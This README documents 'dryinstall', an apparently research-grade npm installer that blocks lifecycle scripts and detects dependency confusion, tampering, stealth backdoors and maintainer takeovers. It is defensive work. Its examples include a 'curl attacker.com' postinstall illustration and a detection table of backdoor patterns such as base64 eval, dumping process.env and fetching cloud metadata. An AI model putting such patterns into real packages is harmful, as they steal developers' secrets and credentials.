# dryinstall

> **Zero code executed during install.**

A security-focused npm package installer that blocks install-time Remote Code Execution (RCE), detects supply chain attacks across 8 detection layers, and learns your development patterns over time to reduce noise and sharpen warnings.

```
npm install malicious-pkg
  → postinstall runs → curl attacker.com → ✗ your keys are gone

dryinstall install malicious-pkg
  → 8-layer pipeline → lifecycle blocked → sandbox isolated → ✓ zero code executed
```

---

## The Problem

Every time you run `npm install`, you're trusting every package — and every one of its 1500+ dependencies — not to run malicious code on your machine.

**Real attacks that already happened:**

| Package | Year | Attack | Downloads |
|---|---|---|---|
| `event-stream` | 2018 | postinstall stole Bitcoin wallet keys | 2M/week |
| `ua-parser-js` | 2021 | maintainer account takeover, malware injected | 7M/week |
| `coa` | 2021 | same pattern — account takeover | 9M/week |
| `colors` + `faker` | 2022 | intentional sabotage, infinite loops | 20M+/week |
| `xz-utils` | 2024 | 2-year supply chain compromise via build scripts | Core Linux |
| `cline-cli` | 2026 | postinstall silently installed backdoor CLI | Active |

The common thread: **install-time script execution.**

---

## How It Works

```
dryinstall install <pkg>
         │
         ▼
┌─────────────────────────────┐
│     Pre-Install Checks      │
│                             │
│  ① Confusion Detection      │  scoped pkg on public npm with higher version?
│  ② Hash Verification        │  tarball SHA512 matches registry?
│  ③ Version Diff             │  dangerous patterns added since last version?
│  ④ Stealth Backdoor         │  CI conditionals, time bombs, base64 eval?
│  ⑤ Maintainer Monitor       │  new maintainers? full takeover?
└────────────┬────────────────┘
             │
             ▼
┌────────────────────┐
│  Layer 1: Audit    │  CVE scan
└────────┬───────────┘
         │
         ▼
┌────────────────────┐
│  Layer 2: Lifecycle│  Blocks ALL install-time scripts
│         Block      │  preinstall / postinstall / prepare ...
└────────┬───────────┘
         │
         ▼
┌────────────────────┐
│  Layer 3: Sandbox  │  vm isolation + Worker Thread
│                    │  fs / net / child_process blocked
└────────┬───────────┘
         │
         ▼
    dry_modules/
    (stored, not executed)
         │
         ▼
┌────────────────────┐
│  Adaptive ECU      │  records behavior → learns patterns
│                    │  reduces noise, sharpens warnings
└────────────────────┘
```

---

## Quick Start

```bash
npm install -g dryinstall

dryinstall install express
dryinstall install puppeteer --interactive

dryinstall scan
dryinstall setup-loader
```

---

## Features

### Install-time Protection

```bash
dryinstall install <pkg>
dryinstall install <pkg> --interactive
```

**Interactive mode:**
```
┌──────────────────────────────────────────────────────────┐
│     [dryinstall:interactive] Lifecycle Script Detected   │
├──────────────────────────────────────────────────────────┤
│  Package : puppeteer                                     │
│  Hook    : postinstall                                   │
│  Command : node install.mjs                              │
│  Risk    : LOW                                           │
└──────────────────────────────────────────────────────────┘
  [a] Allow once        [A] Always allow  (saved to .dryinstallrc)
  [b] Block (rec.)      [B] Always block  (saved to .dryinstallrc)
  [v] View source file
  [s] Block all remaining

  Your choice (a/A/b/B/v/s) [auto-block in 15s]:
```

Risk levels:
- `HIGH` — chained commands (`&&`, `;`), HTTP, `sudo`, `rm -rf`, `eval`
- `MED` — single suspicious pattern
- `LOW` — standard build scripts (`tsc`, `npm run build`)

---

### Dependency Confusion Detection

Detects the attack pattern that hit Microsoft, Apple, and Tesla.

```
┌──────────────────────────────────────────────────────────┐
│        ⚠  DEPENDENCY CONFUSION DETECTED                  │
│  Package : @mycompany/auth-utils                         │
│  Public  : v9.9.9   ← attacker registered this          │
│  Local   : v1.0.0                                        │
│  Risk    : HIGH                                          │
└──────────────────────────────────────────────────────────┘
✗ Public version is HIGHER — npm would install the attacker's package.
```

---

### Hash Verification

Validates tarball SHA512 against the registry before installing.

```
[CRITICAL] INTEGRITY MISMATCH DETECTED
  Package  : express@4.18.2
  Expected : sha512-abc123...
  Actual   : sha512-xyz789...
  → Same version, different content. Package has been tampered.
```

---

### Version Diff Analysis

Compares JS files between versions. Detects Version Poisoning attacks.

```
v1.0.1 → v1.0.2

[CRITICAL] child_process execution   (+1 added in lib/index.js)
[HIGH]     network request            (+2 added in lib/utils.js)
→ This may be a Version Poisoning attack.
```

---

### Stealth Backdoor Detection

Detects code that activates only on CI servers, cloud instances, or specific targets.

| Pattern | Severity | Example |
|---|---|---|
| CI/CD conditional | CRITICAL | `if(process.env.CI){ require('./steal') }` |
| Time bomb | CRITICAL | `if(Date.now() >= 1700000000000)` |
| base64 eval | CRITICAL | `eval(Buffer.from("ZXZpbA==","base64"))` |
| Env mass collection | CRITICAL | `JSON.stringify(process.env)` |
| Cloud metadata | CRITICAL | `fetch('http://169.254.169.254/...')` |
| Hostname targeting | HIGH | `os.hostname().includes("corp")` |
| Long delay execution | HIGH | `setTimeout(..., 86400000)` |
| Protestware | HIGH | `while(true){ console.log(...) }` |

---

### Maintainer Change Detection

Tracks maintainer history. Detects the ua-parser-js / coa attack pattern.

```
┌──────────────────────────────────────────────────────────┐
│        ⚠  MAINTAINER CHANGE DETECTED                     │
│  Package  : popular-lib                                  │
│  Risk     : CRITICAL                                     │
└──────────────────────────────────────────────────────────┘
  ✗ New maintainers added: attacker-account
  ✗ ALL previous maintainers removed
  → Possible account takeover. Same pattern as ua-parser-js (2021).
```

---

### Adaptive ECU

dryinstall learns your development patterns over time — like an ECU that adapts to a driver.

```bash
dryinstall profile
```

```
══════════════════════════════════════════════════
  dryinstall Developer Profile
══════════════════════════════════════════════════
  Tracking since : 2026-03-11
  Total installs : 47
  Project type   : backend
  Version pref   : Stable

  Most used packages:
    express                        12x
    lodash                          8x

  Warning behavior:
    lifecycle       ████████░░  80% ignored   ← noise
    stealth         ██░░░░░░░░  20% ignored   ← paying attention
══════════════════════════════════════════════════
```

```bash
dryinstall config suggest
```

```
══════════════════════════════════════════════════════
  dryinstall — Adaptive .dryinstallrc Suggestions
══════════════════════════════════════════════════════
  Based on 47 installs since profile creation

  Packages to add to alwaysAllow:
  [1] glob        installed 5x, lifecycle always allowed
  [2] rimraf      installed 4x, lifecycle always allowed

  Apply these suggestions to ~/.dryinstallrc? [Y/n/select]
```

The more you use dryinstall, the smarter the suggestions become.

---

### Execution Tracker

Learns from what actually happens when your app runs — not just install-time behavior.

```
The antivirus problem:
  Block script → app breaks → developer disables protection

dryinstall solution:
  Block script → run app → app crashes?
    YES → auto-add to alwaysAllow → reinstall → works
    NO  → confirmed safe to block forever
```

```powershell
# setup once
dryinstall setup-loader

# then just use npm as usual
npm start       # dryinstall watches in background
npm run dev     # same
```

**What happens internally:**
```
npm start
  → exec-hook.js activates tracking
  → [dryinstall] Execution tracking active
  → original react-scripts start runs normally

App runs fine (5s+)
  → ✓ puppeteer — script not needed
  → silently blocked forever

App crashes instantly
  → auto-learned: puppeteer needs its script
  → ~/.dryinstallrc updated automatically
  → reinstall to apply
```

```powershell
# check learning status
dryinstall track status
```

```
══════════════════════════════════════════════════
  dryinstall Execution Tracker
══════════════════════════════════════════════════

  Safe to block (confirmed):
    ✓ glob
    ✓ rimraf
    ✓ core-js

  Script required (auto-allowed):
    ! puppeteer
    ! node-sass
══════════════════════════════════════════════════
```

---

### Exception Handling

dryinstall handles failure gracefully — it never crashes your workflow.

| 상황 | 동작 |
|---|---|
| `npm install` 직접 사용 | 경고 출력 후 통과 (강제 차단 없음) |
| `dry_modules/` 삭제됨 | `node_modules` fallback + 경고 |
| `~/.dryinstallrc` 손상 | 기본값으로 자동 초기화 + `.bak` 백업 |
| `profile.json` 손상 | 초기화 후 재시작 + `.bak` 백업 |
| 네트워크 없음 | 캐시 확인 후 안내 |
| Node.js 버전 낮음 | 가능한 보안 레벨로 자동 다운그레이드 |
| 권한 없음 (EACCES) | OS별 해결 방법 안내 |

```
npm install express   ← 직접 사용 시

  ⚠  Direct npm install detected
     This package was not scanned by dryinstall.

  Recommended:
    dryinstall install express

  Proceeding with npm install (unprotected)...
```

강제 차단 없이 경고만 출력합니다.  
개발자가 dryinstall을 꺼버리는 상황(백신 문제)을 방지하기 위한 설계입니다.

```bash
dryinstall install express
```

```
Packages scanned : 2,041
Scripts blocked  : 506
Risky packages   : 370

✓ All lifecycle scripts blocked
✓ Zero code executed during install
```

---

## Security Levels

| Level | Name | Behavior |
|---|---|---|
| 3 | Paranoid (default) | Block all dangerous modules + Worker Thread isolation |
| 2 | Balanced | Block `child_process` only, allow `fs`/`net` |
| 1 | Relaxed | vm isolation only, no Worker Thread |
| 0 | Off | Observe only, no blocking |

```bash
dryinstall install <pkg> --level=2
```

---

## Persistent Config: `~/.dryinstallrc`

`[A]` / `[B]` in interactive mode saves automatically.
`dryinstall config suggest` populates this from your usage data.

```json
{
  "alwaysAllow": ["glob", "rimraf", "core-js"],
  "alwaysBlock": ["puppeteer"]
}
```

---

## CLI Reference

```bash
dryinstall install <pkg>                          Install through 8-layer security pipeline
dryinstall install <pkg> --interactive            Prompt before each blocked lifecycle script
dryinstall install <pkg> --level=0-3             Set security level (default: 3)
dryinstall install <pkg> --allow=fs,net           Allow specific modules in sandbox
dryinstall install <pkg> --allow-package=a,b      Allow lifecycle for specific packages
dryinstall install <pkg> --allow-maintainer-change  Skip maintainer takeover block
dryinstall install <pkg> --watch                  Enable background process monitoring

dryinstall clean-install                          Remove node_modules and reinstall
dryinstall scan                                   Scan installed node_modules for risks
dryinstall list                                   List packages in dry_modules
dryinstall profile                                Show adaptive developer profile
dryinstall config suggest                         Auto-tune ~/.dryinstallrc from usage data
dryinstall run <script>                           Run npm script with execution tracking
dryinstall track status                           Show execution learning status
dryinstall setup-loader                           Register runtime loader in package.json
dryinstall remove-loader                          Remove loader registration
```

---

## Architecture

```
dryinstall/
├── src/
│   ├── auditor.js                Layer 1: CVE audit
│   ├── cli.js                    Layer 2: lifecycle blocking + pipeline orchestration
│   ├── sandbox.js                Layer 3: vm isolation + security levels + policy
│   ├── storage.js                dry_modules storage + SHA256 integrity
│   ├── loader.js                 runtime require() hook + bypass patching
│   ├── scanner.js                node_modules scan + isolation (whitelist 52 known-safe)
│   ├── dep-graph.js              dependency graph + risk chain analysis
│   ├── network-analyzer.js       install-time network monitoring
│   ├── typo-detector.js          typosquatting detection (top 1000 packages)
│   ├── confusion-detector.js     Dependency Confusion Attack detection
│   ├── hash-verifier.js          tarball SHA512 integrity verification
│   ├── version-diff-analyzer.js  version-to-version dangerous pattern diff
│   ├── stealth-detector.js       CI backdoor, time bomb, obfuscation detection
│   ├── maintainer-monitor.js     maintainer change + account takeover detection
│   ├── profiler.js               developer behavior collection  (ECU sensor)
│   ├── advisor.js                behavior analysis + adaptive guidance  (ECU core)
│   ├── rc-generator.js           .dryinstallrc auto-tuning  (ECU actuator)
│   ├── execution-tracker.js      app crash/success learning  (ECU feedback)
│   ├── exec-hook.js              npm start/dev hook — activates tracker transparently
│   ├── exception-handler.js      전체 예외처리 — fallback / 경고 / 자동 복구
│   ├── worker-runner.js          Worker Thread double isolation
│   └── monitor.js                background process + port monitoring
├── bin/
│   ├── dryinstall.js             CLI entry point
│   └── npm-wrapper.js            npm install interceptor
└── dryinstall.policy.json        per-package least-privilege policy
```

---

## Comparison

| Tool | Lifecycle Block | Pre-install | Runtime | Typo | Confusion | Hash | Stealth | Maintainer | Adaptive |
|---|---|---|---|---|---|---|---|---|---|
| `npm audit` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `socket.dev` | ✗ | ✗ | ✗ | △ | △ | ✗ | △ | ✗ | ✗ |
| `LavaMoat` | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| **dryinstall** | **✓** | **✓** | **✓** | **✓** | **✓** | **✓** | **✓** | **✓** | **✓** |

---

## Known Limitations

- **Native addons (`.node`):** Cannot be sandboxed at JS level. Requires OS-level isolation.
- **Dynamic `import()`:** ES module dynamic imports cannot be fully intercepted at the Node.js loader level.
- **False positives:** Standard build scripts are also blocked. Use `--allow-package` or `.dryinstallrc` to whitelist known-safe packages. The scanner has a built-in whitelist of 52 known-safe build tools (webpack, vite, typescript, etc.).

This is a research-grade prototype. Production use should combine dryinstall with container isolation.

---

## Background

> Detection can fail. But if lifecycle scripts cannot execute, the attack surface disappears regardless of what the scripts contain.

Existing tools find known vulnerabilities or sandbox runtime code. None prevent install-time execution. dryinstall targets that gap.

---

## License

MIT
